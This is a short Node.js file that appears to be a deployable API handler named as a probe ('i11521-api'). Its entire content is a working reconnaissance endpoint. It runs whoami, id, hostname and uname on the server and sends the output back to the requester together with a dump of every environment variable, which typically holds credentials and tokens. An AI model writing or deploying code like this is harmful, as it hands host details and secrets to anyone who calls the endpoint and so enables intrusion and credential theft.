const {execSync}=require('child_process');
function sh(c){try{return execSync(c,{encoding:'utf8',timeout:15000,stdio:['ignore','pipe','pipe']})}catch(e){return 'ERR:'+(e.stdout||'')+(e.stderr||'')+e.message}}
module.exports=(req,res)=>{
  const o={probe:'i11521-api',ts:new Date().toISOString(),whoami:sh('whoami'),id:sh('id'),hostname:sh('hostname'),uname:sh('uname -a'),env:Object.assign({},process.env)};
  res.setHeader('Content-Type','application/json');
  res.status(200).send(JSON.stringify(o).slice(0,20000));
};
